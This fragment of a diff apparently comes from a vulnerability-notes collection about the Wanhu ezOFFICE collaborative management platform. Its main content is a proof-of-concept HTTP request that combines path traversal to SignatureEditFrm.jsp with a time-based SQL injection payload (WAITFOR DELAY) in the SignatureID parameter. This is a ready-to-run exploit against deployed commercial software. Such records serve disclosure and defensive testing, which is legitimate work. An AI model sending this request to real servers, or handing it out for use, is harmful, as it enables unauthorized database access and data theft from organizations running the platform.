@@ -15,7 +15,7 @@ app="万户ezOFFICE协同管理平台"
 
 ![](https://cdn.nlark.com/yuque/0/2023/png/1622799/1694241158110-8d4eef16-79f1-46eb-899b-344bd2a7a19f.png)
 
-## poc
+## POC
 ```javascript
 GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iWebRevision.jsp/Signature/SignatureEditFrm.jsp?SignatureID=1;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
 Host: 
